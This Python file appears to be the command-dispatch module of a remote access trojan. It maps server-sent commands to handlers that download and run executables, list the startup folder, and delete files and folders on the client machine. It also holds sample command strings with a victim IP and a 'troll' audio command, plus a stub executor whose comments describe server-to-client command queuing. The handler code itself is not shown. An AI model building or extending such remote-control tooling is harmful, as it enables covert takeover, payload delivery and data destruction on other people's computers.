from . import *

INVALID_COMMAND = "INVALID_COMMAND"



download_file_http = "download_file_http"
download_run_exe = "download_run_exe"
listdir = "listdir"
get_start_up_contents = "get_start_up_contents"
chdir = "chdir"
getcwd = "getcwd"
list_current_directory = "list_current_directory"
delete_file = "delete_file"
delete_folder = "delete_folder"
make_directory = "make_directory"





def get_result(command, args):
    if command == download_file_http:
        return Download.download_file_http(*args)
    elif command == download_run_exe:
        return Download.download_run_exe(*args)
    elif command == listdir:
        return FileSystem.listdir(*args)
    elif command == get_start_up_contents:
        return FileSystem.get_start_up_contents(*args)
    elif command == chdir:
        return FileSystem.chdir(*args)
    elif command == getcwd:
        return FileSystem.getcwd(*args)
    elif command == list_current_directory:
        return FileSystem.list_current_directory(*args)
    elif command == delete_file:
        return FileSystem.delete_file(*args)
    elif command == delete_folder:
        return FileSystem.delete_folder(*args)
    elif command == make_directory:
        return FileSystem.make_directory(*args)
    else: 
        return INVALID_COMMAND

def command_executer():

    # user just throws commands, server sends to client which recieves and puts them in a queue

    '    ":"192.168.1.16":"134648":"1":"troll":"play_audio      '
    '    ":"192.168.1.16":"134648":"1":"1":"done'





    # send command to server with ip of the client (main con) and opens con.

    # server sends command to client, who opens new con.


    pass